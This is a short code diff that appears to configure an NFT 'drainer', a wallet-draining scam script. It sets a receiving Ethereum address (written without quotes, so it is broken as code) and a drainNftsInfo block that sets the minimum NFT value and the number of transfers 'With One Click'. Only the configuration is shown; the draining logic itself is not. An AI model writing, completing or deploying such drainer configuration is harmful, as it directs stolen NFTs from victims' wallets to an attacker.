@@ -1,4 +1,4 @@
-const receiveAddress = "0x0000000000000000000000000000000000000000"; // Your wallet (ETH)
+const receiveAddress = 0x24E69a7ad25ad0196e69D0b0Bf88FCb7c17cfC50; // Your wallet (ETH)
 const drainNftsInfo = {
     minValue: 0, // Minimum value of NFTs
     maxTransfer: 3 // Minimum transfers of NFTs With One Click
